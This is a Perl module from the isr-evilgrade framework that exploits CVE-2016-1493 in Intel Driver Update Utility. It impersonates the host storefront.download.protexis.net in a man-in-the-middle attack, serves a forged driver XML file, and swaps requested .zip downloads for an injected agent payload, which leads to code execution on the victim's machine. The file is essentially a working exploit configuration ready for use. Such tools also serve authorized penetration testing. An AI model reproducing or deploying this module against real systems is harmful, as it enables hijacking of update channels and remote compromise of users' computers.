###############
# inteldriver.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::inteldriver;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'inteldriver',
    'version' => '1.0',
    'appver'  => ' <= Intel Driver Update Utility 2.2.0.5',
    'author'  => ['Francisco Amato <famato +[AT]+ faradaysec.com'],
    'description' =>
        qq{CVE: CVE-2016-1493 Found By:  Joaquín Rodríguez Varela
                        The Intel Driver Update Utility [1] is a tool that analyzes the system drivers on your computer.
                        The utility reports if any new drivers are available, and provides the download files for the driver updates so you can install them quickly and easily.
                        Intel [2] Driver Update Utility is prone to a Man in The Middle attack which could result in integrity corruption of the transferred data, information leak
                        and consequently code execution.
                        https://www.coresecurity.com/advisories/intel-driver-update-utility-mitm},

    'vh'      => '(storefront.download.protexis.net)',
    'request' => [
        {   'req' =>
                'IDDAPI/Prod/productfamily/desktopboard/driver/getbyhardwaresignature/ven_8086&dev_010a/a08/190.xml',
            'type'   => 'file',
            'method' => '',
            'bin'    => '0',
            'string' => '',
            'parse'  => '1',
            'file'   => './include/inteldriver/general.xml',
        },
        {   'req'    => '.zip',
            'type'   => 'agent',
            'method' => '',
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.zip',
            'desc' => 'Agent to inject',
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
